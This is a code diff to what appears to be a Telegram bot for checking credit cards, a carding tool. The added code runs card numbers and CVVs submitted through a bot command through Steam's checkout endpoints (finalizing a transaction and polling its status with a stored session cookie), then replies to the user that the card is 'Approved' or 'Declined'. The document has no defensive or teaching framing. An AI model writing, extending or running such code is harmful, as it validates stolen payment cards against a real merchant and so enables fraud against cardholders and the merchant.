@@ -26,6 +26,7 @@ from dotenv import load_dotenv
 
 load_dotenv()
 
+
 def get_token():
     dict_raw_data = {}
     cokie = ""
@@ -111,7 +112,9 @@ async def check_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> N
 
             headers = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                        "cookie": token}
-            response = requests.post(url, headers=headers, data=raw_data)
+            response = requests.post(
+                url, headers=headers, data=raw_data).json()
+            print(response)
             declined_result = """⚜️Card ➔  """ + cc + """
 ⚜️Status ➔  𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌ 
 ⚜️Gateway ➔   Paypal 0.1 $ 
@@ -135,7 +138,30 @@ async def check_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> N
  - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
 
 """
-            await update.message.reply_text(approved_result if response.json()["success"] == 1 else declined_result)
+            if response["success"] != 1:
+                await update.message.reply_text(declined_result)
+            else:
+                trans_id = response["transid"]
+                url = "https://checkout.steampowered.com/checkout/finalizetransaction/"
+                raw_data = {"CardCVV2": cc_infos[3], "transid": trans_id,
+                            "browserInfo": '{"language":"en-US","javaEnabled":"false","colorDepth":24,"screenHeight":1080,"screenWidth":1920}'}
+                response = requests.get(
+                    url, headers=headers, params=raw_data).json()
+                print(raw_data)
+                print(response)
+                if response["success"] != 22:
+                    await update.message.reply_text(declined_result)
+                else:
+                    url = 'https://checkout.steampowered.com/checkout/transactionstatus/'
+                    raw_data = {"count": 0, "transid": trans_id}
+                    print(raw_data)
+                    response = requests.get(url, headers=headers, params=raw_data).json()
+                    print(response)
+                    if (response["success"] == 22):
+                        await update.message.reply_text(approved_result)
+                    else:
+                        await update.message.reply_text(declined_result)
+
     else:
         await update.message.reply_text("Credit card is not correct " + cc)
 
